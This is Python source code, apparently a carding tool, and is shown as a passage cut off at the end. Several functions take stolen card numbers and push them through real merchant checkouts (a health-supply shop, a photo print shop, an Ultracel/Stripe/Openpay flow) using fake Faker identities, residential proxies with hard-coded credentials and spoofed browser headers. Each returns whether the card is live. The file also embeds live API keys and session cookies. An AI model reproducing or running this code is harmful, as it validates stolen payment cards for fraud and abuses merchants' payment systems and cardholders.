NID=524=Bek0erebHMhlGTrbCEdma4cvcnO0wOLhOukqnIl_u9znmY8XBKOrCXxbivgMoqbNpI1bBf099v2CSZQPlJnZxWISXv5xJ3zr3daxHYinXe5yguKeFl-huKvq_BZEhI2RTrDJxvh1G7RG2aQkZ_CIPmOoE7vl9BIH99opFuEBfsttncQQ9k9g4wUeZDBEQhoAJX1vSH1_wJP4LJOCUFsVMqKq-rgMV2jMXERsCL6MTPb9k965rTlf-ZfB2t_fLFRwLvD13OgWDjkmIL93BGeHT8dj_uweizLFm9smVZjK1s_Mb7pUv55S9k0KRHFgfnXnccSopr87nkuOxouixr_da6bXf1Gnid5Mx87MtEO_Hs657vpUAoGJ2BJALOXfD9b1TxHBgBC_bZEYbD5duqxamjzuzyOGBSOTLx8O-Y9PKUKi1pkHrGh9-6mnrSq1_wNNIXAuRqkkydRB8pQhPMJth9hLacvIFfohoHwmovCICfj9fLAe7ZSkSFXZ6DaqZsoY4p1SNQe4JA52-IZMoWvR2jtkY828XKDcMYPHrQ1oAKH0Wvz5oVjMljW-xCFs8TCW40tUKBtiHW7B0QyJ_tJtsbtdmOSj0fUOpKnSf_8R8Ber9fLqXO0pWbyDp1vSSIQyrit2Xx8DctdgB2eTzWGhb3B8VMZ2ma1-ei5RdaRWj-3lePpcfRFuOaP_naKO-9NiFiWKo7ASJxPbE_gNAnrDsguf_2ADk-c1IcUWEaRU27P92puZ0pIue3Bm1kC4I8y1v5A2doGf4CzNNl596nGBX4eNEA9nL1cziz_G9tFihekHuhiarIier2FXgrPfSPKlVsNOymJh3y_TSESgWyBllv0rf2FHOn3zZ2E4M2RN-VcrPS09xFg7QTmgt5EEFpNAGOS1SjBgHVGqoDGqwVyd5-SUTiROv5kZ-Lfqc7owVLvojMW5A3_bViStAao_G4fWfqdLUI1GsONzBSWkOlD1qOgloZx7zNCQA8QU6Rb1WM-CQEm_elffQkzwGKUYsftKTh9fCwkYplao87RrRq8vK48di6TBCs5Xct1aTSzNNlRY_SQTBfcat8UBEPbyAifhWhkhfdaJgABNkhpHKkLt20XRmwH0m3qI95G0rUn5xPNw1fWtiQx2gBZ-EKUFqIXdd7ysQrjwfitoaSurqj9DnL0O-ecF1EpP3LyohVfsr7-aq3FLi8uXXl9d3XqTzdTGMsa38-npXWI_0d_uQx1ICu0rsfnDXn39A-zo8m6c00E9m_3wpIDdztTEtXfy3G_ZnRtoLqKSFJ20AGDGjeVG8m5unNUGdGhcTVlL-qSGFSIVjUhAIgvUi9XCt-97WSgtDXPA2VjPPUqHs6vETlqkBA2qDdkcLdvSfO88vJkKsRfRnl0Bma26iB-sweZBamYVuXweaJwzDdYo7wR0X2c5XdyB-Er6EZtkgc_qlQ; __Secure-3PSID=g.a000yAgaJZAB-33BExEU7MPatksZyWbMvzEJu1MYf87QmE-9Hq2XHuv7egTyDyMgZFIi8BIdFQACgYKAYUSARYSFQHGX2MiqSKus2I6NDf0KOoh5a-bnRoVAUF8yKoJRk6WBabOlxQZyfARSaoC0076; __Secure-3PSIDCC=AKEyXzUQvIS12ThoxbbQc9u8ZRHCYAqqNRT5TtEtqTSRHJSQpBfFDbyklxue94v-oXJ5BrFr9XM',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwpBsxsF3eY665Ye&c={token_captcha}'

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=21498&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=772b99bb-ce50-453b-b6e5-8546cad0ee15550ee6&sid=e0c65b9d-83dd-4e42-96fb-90d94cc5d6c0b77f5b&key=pk_live_51KKQdXAt4hwC9EzPlECBse8oe2zN759C4zpyQtIPxEhTjFnu6o0AWxouefUoWPPv2hV6a1H4fUWLwF8S1wVA8MLW00zHX9O87k&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic cGtfNWE0ZTlkNzY3NWQ4NDBiMTlkYTY1OWE1YWY1MTRjZjY6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'holder_name': f'{name} {last} ',
                'card_number': cc_number,
                'cvv2': cvv,
                'expiration_month': mes,
                'expiration_year': ano_number[-2:],
            }

            response = c.post('https://api.openpay.mx/v1/mznycdanwswudouttxam/tokens', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            tokenop = responsePm['id']
            print(tokenop)


            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': tokenop,
                    'openpay_device_session_id': 'qjFpDcuM8Pf4ebPXPwEgr99Sl0DSNMz0',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': id_servicio,
            }

            response = c.post('https://ultravision.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)

            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': id_servicio,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': True,
                    'payment_plan': None,
                    'nir': None,
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'bundle_id': '75',
                },
                'user_id': id_servicio,
            }

            response = c.post('https://ultravision.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            data = json.loads(response.text) 
            try:
                # Si es un error (Stripe - tarjeta declinada u otro)
                if 'message' in data and 'error' in data['message']:
                    error_info = data['message']['error']
                    decline_code = error_info.get('decline_code', 'desconocido')
                    message = error_info.get('message', 'Error desconocido')
                    return (
                        f"❌ *Tarjeta Declinada*\n"
                        f"*Motivo:* {message}\n"
                        f"*Decline Code:* `{decline_code}`"
                    )

                # Si es una respuesta de compra exitosa
                elif 'altan_service_bundle_order' in data:
                    orden = data['altan_service_bundle_order']
                    status = orden.get('status')
                    if status == 'delivered':
                        return (
                            f"✅ *Compra Aprobada*\n"
                            f"*Estado:* `{status}`"
                        )
                    else:
                        return (
                            f"⚠️ *Compra No Completada*\n"
                            f"*Estado:* `{status}`"
                        )

                # Caso desconocido
                return (
                    "❓ *Respuesta desconocida*\n"
                    "No se pudo interpretar el resultado de la operación."
                )

            except Exception as e:
                return (
                    "⚠️ *Error al procesar*\n"
                    f"Detalles: `{str(e)}`"
                )


                        

            
                                    
            


           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}

import random
from faker import Faker
from random import choice
from urllib.parse import quote
from curl_cffi import requests
from colorama import init, Fore
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


async def chase(card: str) -> str:    
    max_retries = 5
    retry_count = 0
    while retry_count < max_retries:
        try:
            init(autoreset=True)
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            cliente.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            cc_type = {"3":"Amex" ,"4":"Visa", "5":"MasterCard", "6":"Discover"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}%20street%20{number}"
            email = usuario()['email']
            phone = usuario()['phone']

            headers = {"Host": "www.healthykin.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            result  = cliente.get(url="https://www.healthykin.com/p-4172-gelrite-hand-sanitizer.aspx", headers=headers)

            #============[Requests 1]============#
            headers = { "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/p-4172-gelrite-hand-sanitizer.aspx" }
            result  = cliente.get(url="https://www.healthykin.com/addtocart.aspx?ProductID=4172&VariantID=19519&Quantity=1", headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')

            #============[Requests 2]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3A%2F%2Fwww.healthykin.com%2Fp-4172-gelrite-hand-sanitizer.aspx", }
            data    = f"_TSM_HiddenField_={hiddenfield}&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__EVENTVALIDATION={quote(event_valid)}&ctl00%24PageContent%24ctrlShoppingCart%24ctl00%24txtQuantity=1&ctl00%24PageContent%24btnCheckOutNowBottom=Checkout+Now"
            result  = cliente.post(url="https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3a%2f%2fwww.healthykin.com%2fp-4172-gelrite-hand-sanitizer.aspx", data=data, headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')

            #============[Requests 3]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/checkoutanon.aspx?checkout=true" }
            data    = f"_TSM_HiddenField_={hiddenfield}&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__EVENTVALIDATION={quote(event_valid)}&ctl00%24PageContent%24EMail&ctl00%24PageContent%24Password&ctl00%24PageContent%24Skipregistration=Guest%20Checkout"
            result  = cliente.post(url="https://www.healthykin.com/checkoutanon.aspx?checkout=true", data=data, headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')

            #============[Requests 4]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true" }
            data    = f"_TSM_HiddenField_={hiddenfield}&__EVENTTARGET=ctl00%24PageContent%24btnContinueCheckout&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=961&__EVENTVALIDATION={quote(event_valid)}&ctl00%24PageContent%24txtSkipRegEmail={name}.{last}{number}%40gmail.com&ctl00%24PageContent%24ctrlBillingAddress%24NickName=&ctl00%24PageContent%24ctrlBillingAddress%24FirstName={name}&ctl00%24PageContent%24ctrlBillingAddress%24LastName={last}&ctl00%24PageContent%24ctrlBillingAddress%24Phone={phone}&ctl00%24PageContent%24ctrlBillingAddress%24Company=None&ctl00%24PageContent%24ctrlBillingAddress%24ResidenceType=Residential&ctl00%24PageContent%24ctrlBillingAddress%24Address1={street}&ctl00%24PageContent%24ctrlBillingAddress%24Address2=&ctl00%24PageContent%24ctrlBillingAddress%24Suite=&ctl00%24PageContent%24ctrlBillingAddress%24Country=United+States&ctl00%24PageContent%24ctrlBillingAddress%24City=New+York&ctl00%24PageContent%24ctrlBillingAddress%24State=NY&ctl00%24PageContent%24ctrlBillingAddress%24Zip=10080&ctl00%24PageContent%24ctrlShippingAddress%24NickName=&ctl00%24PageContent%24ctrlShippingAddress%24FirstName={name}&ctl00%24PageContent%24ctrlShippingAddress%24LastName={last}&ctl00%24PageContent%24ctrlShippingAddress%24Phone={phone}&ctl00%24PageContent%24ctrlShippingAddress%24Company=None&ctl00%24PageContent%24ctrlShippingAddress%24ResidenceType=Residential&ctl00%24PageContent%24ctrlShippingAddress%24Address1={street}&ctl00%24PageContent%24ctrlShippingAddress%24Address2=&ctl00%24PageContent%24ctrlShippingAddress%24Suite=&ctl00%24PageContent%24ctrlShippingAddress%24Country=United+States&ctl00%24PageContent%24ctrlShippingAddress%24City=New+York&ctl00%24PageContent%24ctrlShippingAddress%24State=NY&ctl00%24PageContent%24ctrlShippingAddress%24Zip=10080"
            result  = cliente.post(url="https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true", data=data, headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')
            select_id   = capture(result.text, 'selected="selected" value="', '"')

            #============[Requests 5]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true" }
            data    = f"_TSM_HiddenField_={hiddenfield}&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__EVENTVALIDATION={quote(event_valid)}&ctl00%24PageContent%24ddlChooseShippingAddr={select_id}&ctl00%24PageContent%24ctrlShippingMethods%24ctrlShippingMethods=1&ctl00%24PageContent%24btnContinueCheckout=Continue+Checkout"
            result  = cliente.post(url="https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true", data=data, headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')
            select_id   = capture(result.text, 'selected="selected" value="', '"')

            #============[Requests 6]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/checkoutpayment.aspx" }
            data    = f"__EVENTTARGET=&__EVENTARGUMENT=&_TSM_HiddenField_={hiddenfield}&__LASTFOCUS=&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__EVENTVALIDATION={quote(event_valid)}&ctl00%24PageContent%24ddlChooseBillingAddr={select_id}&ctl00%24PageContent%24ctrlPaymentMethod%24PaymentSelection=rbCREDITCARD&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCName={name}+{last}&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCNumber={cc_number}&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCVerCd={cvv}&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCType={cc_type[cc_number[0:1]]}&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCExpMonth={mes}&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCExpYr={ano_number}&ctl00%24PageContent%24btnContCheckout=Continue+Checkout"
            result  = cliente.post(url="https://www.healthykin.com/checkoutpayment.aspx", data=data, headers=headers)
            view_state  = capture(result.text, 'id="__VIEWSTATE" value="', '"')
            view_gen = capture(result.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            event_valid = capture(result.text, 'id="__EVENTVALIDATION" value="', '"')
            hiddenfield = capture(result.text, 'id="_TSM_HiddenField_" value="', '"')

            #============[Requests 7]============#
            headers = { "origin": "https://www.healthykin.com", "content-type": "application/x-www-form-urlencoded", "user-agent": agente_user.random, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "referer": "https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD", }
            data    = f"__EVENTTARGET=ctl00%24PageContent%24btnContinueCheckout2&__EVENTARGUMENT=&_TSM_HiddenField_={hiddenfield}&__VIEWSTATE={quote(view_state)}&__VIEWSTATEGENERATOR={view_gen}&__EVENTVALIDATION={quote(event_valid)}"
            result  = cliente.post(url="https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD", data=data, headers=headers)

            message = capture(result.text, 'class="error-large">', ' P')
            if not message:
                return  f"|error|msg_not_found|"
            elif "CVV2 Mismatch." in message:
                return f"|approved|{message}|"
            elif "Insufficient funds available." in message:
                return f"|approved|{message}|"
            else:
                return  f"|declined|{message}|"
            
        except Exception as e:
            #print(e)
            retry_count += 1
    else:
        return  f"|error|retries_fail|"              
           
           
import requests
from faker import Faker



async def paypal(ccsa: str) -> str:
    try:
        if '|' in ccsa:        expl = ccsa.strip().split('|')     
        if ':' in ccsa:        expl = ccsa.strip().split(':')     
                   
        cc = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]             
        fake = Faker()
        nombre = fake.first_name().lower()
        last = fake.last_name().lower()


        username = "geonode_rPnKX90jVA"
        password = "4f23e1c3-3338-4426-8352-10cea0dc5caf"
        GEONODE_DNS = "premium-residential.geonode.com:9000"
        proxies = {"http":"http://{}:{}@{}".format(username, password, GEONODE_DNS)}                     
        session = requests.Session()
        session.proxies = proxies
        

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','referer': 'https://lschroederphoto.com/gallery/gallery.php?cat=animals&subcat=arthropods','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        params = {'id': '235',}

        session.get('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers)

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/buy.php?id=235','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        params = {'id': '235',}
        data = {'material': 'AcrylicPrint','sizeprice': '8x8 ($117.00)','filename': '029A7015','caption': 'Five-Legged Jumping Spider',}
        session.post('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers, data=data)
        
        
        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/cart.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = {'zipCode': '','subtotal': '117.00','salesTax': '0.00','shippingCost': '7.50','couponValue': '0.00','totalPrice': '117.00',}
        session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
        

        headers = {'authority': 'lschroederphoto.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/checkout.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = {'firstName': nombre,'lastName': nombre,'address': '10301 NW 108TH AVE  ','address2': '','city': 'miami','state': 'FL','newzip': '33166','country': 'United States','email': nombre+'@gmail.com','manual_checkout': 'true','oldzip': '','couponValue': '0.00','salesTax': '0.00','shippingCost': '7.50','subtotal': '117.00','totalPrice': '117.00',}
        checkout = session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
        

        headers = {'authority': 'lschroederphoto.com','accept': '*/*','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhxWqDBU9FLVxHIeR','origin': 'https://lschroederphoto.com','referer': 'https://lschroederphoto.com/shop/checkout.php','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',}
        data = '------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="user_action"\r\n\r\nCONTINUE\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="landing_page"\r\n\r\nBILLING\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="shipping_preference"\r\n\r\nSET_PROVIDED_ADDRESS\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nHarold\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nsmith\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="address1"\r\n\r\n10301 NW 108TH AVE  \r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="address2"\r\n\r\n\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="city"\r\n\r\nmiami\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="state"\r\n\r\nFL\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="zip"\r\n\r\n33166\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; 